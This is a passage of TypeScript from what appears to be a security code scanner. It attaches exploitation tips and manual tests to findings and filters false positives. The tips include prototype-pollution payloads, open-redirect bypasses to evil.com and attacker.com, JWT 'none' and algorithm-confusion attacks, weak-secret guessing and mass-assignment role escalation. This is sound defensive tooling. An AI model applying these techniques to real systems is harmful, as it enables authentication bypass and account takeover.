    else if (rid.includes('prototype') || rid.includes('pollution') || category.includes('prototype')) {
      f.exploit.description = 'Prototype Pollution - inject properties into Object.prototype.';
      f.exploit.tips = [
        'Find the gadget: Look for code that reads undefined properties from objects.',
        'Common gadgets: Template engines (EJS, Pug), jQuery.extend, lodash.merge.',
        'Exploitation path: PP → RCE requires a gadget that uses the polluted property.',
        '__proto__ vs constructor: Both can be used, some filters only block one.',
        'Nested objects: {"a": {"__proto__": {"polluted": true}}} may bypass shallow checks.',
      ];
      f.manualTest = [
        'Send {"__proto__": {"test": "polluted"}} and check if ({}).test === "polluted".',
        'For RCE, look for template engines or child_process usage.',
        'Check if Object.freeze(Object.prototype) is used as a defense.',
      ];
    }
    
    // Open Redirect Analysis
    else if (rid.includes('redirect') || category.includes('redirect')) {
      f.exploit.description = 'Open Redirect - redirect users to attacker-controlled sites.';
      f.exploit.tips = [
        'Bypass techniques: //evil.com, /\\evil.com, https:evil.com, javascript: URLs.',
        'Protocol-relative: //attacker.com bypasses https-only checks.',
        'Subdomain tricks: Use your-domain.attacker.com or attacker.com#@trusted.com.',
        'Impact escalation: Chain with OAuth flows to steal tokens.',
        'Validation check: Is it allowlist-based or blocklist-based?',
      ];
      f.manualTest = [
        'Test with //attacker.com or https://attacker.com.',
        'Try URL parsing edge cases: https:attacker.com (missing //).',
        'Check if the redirect preserves query parameters (credential leakage).',
      ];
    }
    
    // JWT Vulnerabilities Analysis
    else if (rid.includes('jwt') || category.includes('jwt')) {
      f.exploit.description = 'JWT Security Issue - authentication/authorization bypass potential.';
      f.exploit.tips = [
        'Algorithm confusion: Change RS256 to HS256 and sign with the public key.',
        'None algorithm: Set alg to "none" and remove the signature.',
        'Key ID injection: The kid header might be vulnerable to SQLi or path traversal.',
        'Weak secrets: HS256 secrets can be brute-forced if weak.',
        'Claim manipulation: Modify sub, role, or admin claims after signature bypass.',
      ];
      f.manualTest = [
        'Decode the JWT at jwt.io and analyze the claims structure.',
        'Try changing the alg to "none" and removing the signature.',
        'If HS256, try common weak secrets (secret, password, etc.).',
      ];
    }
    
    // Mass Assignment Analysis
    else if (rid.includes('mass') || rid.includes('assignment') || category.includes('mass')) {
      f.exploit.description = 'Mass Assignment - set unauthorized object properties via user input.';
      f.exploit.tips = [
        'Identify sensitive fields: isAdmin, role, verified, balance, permissions.',
        'Check ORM schema: Look for fields that shouldn\'t be user-modifiable.',
        'Nested properties: Try user[role]=admin or {"user": {"role": "admin"}}.',
        'Array injection: Some ORMs allow array notation for mass update.',
        'Allowlist vs blocklist: Blocklists are often incomplete.',
      ];
      f.manualTest = [
        'Add extra fields to the request body that map to sensitive DB columns.',
        'Check the database schema for privilege-related columns.',
        'Test with nested objects if flat properties are filtered.',
      ];
    }
    
    // Default analysis for other vulnerability types
    else {
      f.exploit.tips = [
        'Review the code context to understand the data flow.',
        'Identify the source (user input) and sink (dangerous function).',
        'Check for existing security controls and their effectiveness.',
        'Consider the attack surface: Who can trigger this code path?',
        'Assess exploitability: Is this reachable in production?',
      ];
    }
  }

  /**
   * Create a validated result, filtering out nonsense through Zod validation.
   * Applies false positive filtering and coherence checks.
   */
  private createValidatedResult(data: Partial<ScanResult> & { ruleId: string; severity: 'error' | 'warning' | 'info'; message: string; line: number; column: number; file: string }): ScanResult {
    // Normalize message
    if (data.message) {
      data.message = String(data.message).replace(/\s+/g, ' ').trim().slice(0, 800);
    }

    // Normalize matched code — keep snippets short for manual analysis (good spots only)
    if (data.matchedCode) {
      data.matchedCode = String(data.matchedCode)
        .replace(/\r\n/g, '\n')
        .replace(/\r/g, '\n')
        .replace(/[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]/g, '')
        .trim();
      if (data.matchedCode.length > 600) {
        data.matchedCode = this.cleanEvidenceSnippet(data.matchedCode, 550);
      } else if (data.matchedCode.length > 3000) {
        data.matchedCode = data.matchedCode.slice(0, 2997) + '...';
      }
    }

    // Normalize context code and ensure coherence
    if (data.contextCode) {
      data.contextCode = String(data.contextCode)
        .replace(/\r\n/g, '\n')
        .replace(/\r/g, '\n')
        .replace(/[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]/g, '')
        .trim();
      
      // Ensure context is coherent (not just fragments)
      if (data.contextCode.length > 0) {
        // Remove leading/trailing incomplete lines if they look truncated
        const contextLines = data.contextCode.split('\n');
        if (contextLines.length > 2) {
          // Check if first line is incomplete (no statement start)
          const firstLine = contextLines[0].trim();
          if (/^[)\]},;]/.test(firstLine) && !/^\s*(if|else|for|while|function|class|const|let|var|return|export|import)/.test(firstLine)) {
            contextLines.shift();
          }
          // Check if last line is incomplete
          const lastLine = contextLines[contextLines.length - 1].trim();
          if (/[{(,+\-*/%&|^!<>=?:]$/.test(lastLine) && !lastLine.endsWith('=>')) {
            contextLines.pop();
          }
          data.contextCode = contextLines.join('\n');
        }
      }
      
      if (data.contextCode.length > 5000) {
        data.contextCode = data.contextCode.slice(0, 4997) + '...';
      }
    }

    // Apply false positive filtering - reduce severity for likely FPs
    data = this.applyFalsePositiveFiltering(data);

    // Validate highlights
    if (data.matchedCodeHighlights) {
      data.matchedCodeHighlights = data.matchedCodeHighlights.filter(h => {
        try {
          CodeHighlightSchema.parse(h);
          return true;
        } catch {
          return false;
        }
      });
    }

    // Validate taint traces
    if (data.taintTrace) {
      data.taintTrace = data.taintTrace.filter(t => {
        try {
          TaintTraceSchema.parse(t);
          return true;
        } catch {
          return false;
        }
      });
    }

    // Try to parse with schema, fallback to basic validation
    try {
      return ScanResultSchema.parse(data) as ScanResult;
    } catch (e) {
      // Return basic valid structure
      return {
        ruleId: data.ruleId || 'unknown',
        severity: data.severity || 'info',
        message: data.message || 'Security issue detected',
        line: Math.max(0, data.line || 0),
        column: Math.max(0, data.column || 0),
        file: data.file || 'unknown',
        pattern: data.pattern,
        matchedCode: data.matchedCode,
        matchedCodeHighlights: data.matchedCodeHighlights,
        contextCode: data.contextCode,
        contextStartLine: data.contextStartLine,
        contextEndLine: data.contextEndLine,
        category: data.category,
        cwe: data.cwe,
        owasp: data.owasp,
        confidence: data.confidence || 'unknown',
        taintTrace: data.taintTrace,
        trace: data.trace,
        entryPoint: data.entryPoint,
        parameter: data.parameter,
        impact: data.impact,
        remediation: data.remediation,
        chainable: data.chainable,
        flowPath: data.flowPath,
        exploitability: data.exploitability,
        exploitabilityReasons: data.exploitabilityReasons,
        exploit: data.exploit,
      };
    }
  }

  /**
   * Apply false positive filtering rules to reduce noise.
   * Returns the data with potentially adjusted severity/confidence.
   */
  private applyFalsePositiveFiltering(data: Partial<ScanResult> & { ruleId: string; severity: 'error' | 'warning' | 'info'; message: string; line: number; column: number; file: string }): typeof data {
    const matchedCode = data.matchedCode || '';
    const contextCode = data.contextCode || '';
    const file = data.file || '';
    const ruleId = (data.ruleId || '').toLowerCase();

    // Check for false positive patterns in the matched code (not in file for type-only - file check can over-suppress)
    for (const fpPattern of Scanner.FALSE_POSITIVE_PATTERNS) {
      if (fpPattern.test(matchedCode)) {
        if (data.severity === 'error') {
          data.severity = 'warning';
          data.confidence = 'low';
          data.message += ' (Potential false positive - verify manually)';
        } else if (data.severity === 'warning') {
          data.severity = 'info';
          data.confidence = 'low';
        }
        break;
      }
    }
    // Hardcoded-secret: skip placeholder / example values
    if (ruleId.includes('hardcoded-secret') || ruleId.includes('secret')) {
      const placeholderSecret = /(?:your[-_]?(?:api[-_]?key|secret|key)|replace[-_]?me|changeme|xxx+|example\.com|placeholder|dummy|fake|test[-_]?key|sk[-_]?test|pk[-_]?test)/i.test(matchedCode);
      if (placeholderSecret) {
        data.severity = 'info';
        data.confidence = 'low';
        data.message += ' (Placeholder/example value - verify if real secret)';
      }
    }

    // Check for safe patterns in context that reduce risk
    let safePatternCount = 0;
    for (const safePattern of Scanner.SAFE_CONTEXT_PATTERNS) {
      if (safePattern.test(contextCode)) {
        safePatternCount++;
      }
    }
    if (safePatternCount >= 2) {
      if (data.severity === 'error') {
        data.severity = 'warning';
        data.confidence = data.confidence === 'very-high' ? 'high' : data.confidence === 'high' ? 'medium' : 'low';
        data.message += ' (Safe patterns detected in context)';
      }
    }
    // Single strong sanitizer in same context can downgrade XSS/HTML
    if ((ruleId.includes('xss') || ruleId.includes('innerhtml') || ruleId.includes('dom')) && safePatternCount >= 1) {
      if (/DOMPurify\.sanitize|sanitizeHtml\s*\(|createTextNode\s*\(|\.textContent\s*=/.test(contextCode) && data.severity === 'error') {
        data.severity = 'warning';
        data.confidence = data.confidence === 'very-high' ? 'high' : data.confidence;
        data.message += ' (Sanitization may be present - verify data flow)';
      }
    }

    // Test file patterns
    if (/\.(test|spec|mock|stub|__tests__|__mocks__)\.(js|ts|jsx|tsx)$/.test(file) ||
        /\/tests?\/|\/specs?\/|\/mocks?\/|\/fixtures?\//i.test(file)) {
      if (data.severity === 'error') {
        data.severity = 'info';
        data.confidence = 'low';
        data.message += ' (In test file)';
      } else if (data.severity === 'warning') {
        data.severity = 'info';
      }
    }

    // Build/dist output
    if (/\/dist\/|\/build\/|\/out\/|\.min\.js$|\.bundle\.js$/i.test(file)) {
      data.confidence = 'low';
      data.message += ' (In build output)';
    }

    // Rule–match coherence
    if (matchedCode && data.ruleId) {
      const isCoherent = this.validateMatchCoherence(matchedCode, data.ruleId);
      if (!isCoherent) {
        data.confidence = 'low';
      }
    }

    return data;
  }

  /**
   * Validate that matched code is coherent with the rule type.
   * Returns false for nonsense matches.
   */
  private validateMatchCoherence(matchedCode: string, ruleId: string): boolean {
    const code = matchedCode.trim();
    const rid = ruleId.toLowerCase();

    if (code.length < 5) return false;
    const stripped = code.replace(/\/\/.*|\/\*[\s\S]*?\*\/|\s+/g, '');
    if (stripped.length < 3) return false;

    // Rule-specific coherence: match must contain sink/source indicators for that rule
    if (rid.includes('xss') || rid.includes('innerhtml') || rid.includes('dom-xss')) {
      if (!/innerHTML|outerHTML|document\.write|insertAdjacentHTML|dangerouslySetInnerHTML|__html|v-html|set:html|unsafeHTML|x-html/i.test(code)) return false;
    }
    if (rid.includes('sql') && rid.includes('injection')) {
      if (!/query|execute|exec|sql|SELECT|INSERT|UPDATE|DELETE|FROM|WHERE|\+\s*['"`]|\$\{|\.query\s*\(/i.test(code)) return false;
    }
    if (rid.includes('command') && rid.includes('injection')) {
      if (!/exec|spawn|child_process|execSync|spawnSync/i.test(code)) return false;
    }
    if (rid.includes('ssrf')) {
      if (!/fetch|axios|http\.|https\.|request\s*\(|got\s*\(|WebSocket|XMLHttpRequest/i.test(code)) return false;
    }
    if (rid.includes('path') && rid.includes('traversal')) {
      if (!/fs\.|readFile|writeFile|createReadStream|path\.|require\s*\(/i.test(code)) return false;
    }
    if (rid.includes('open-redirect') || rid.includes('cwe-601')) {
      if (!/location\.(href|assign|replace)|window\.open|\.href\s*=/i.test(code)) return false;
    }
    if (rid.includes('postmessage') || rid.includes('post-message') || rid.includes('cwe-346')) {
      if (!/postMessage|\.origin|event\.(?:data|source)|message\s*['"]/i.test(code)) return false;
    }
    if (rid.includes('replace-xss') || rid.includes('replace')) {
      if (!/\.replace\s*\(|\.replaceAll\s*\(/i.test(code)) return false;
    }
    if (rid.includes('trust-boundary') || rid.includes('trust-boundary-crossing')) {
      if (!/req\.user|res\.locals|ctx\.state|session\./i.test(code)) return false;
    }
    if (rid.includes('orm-mass-assignment') || rid.includes('mass-assignment')) {
      if (!/\.(update|create|upsert|findByIdAndUpdate|findOneAndUpdate)\s*\(/i.test(code)) return false;
    }
    if (rid.includes('hardcoded-secret') || rid.includes('secret')) {
      if (!/key|secret|password|token|api[_-]?key|private[_-]?key|access[_-]?key/i.test(code)) return false;
    }
    return true;
  }
}
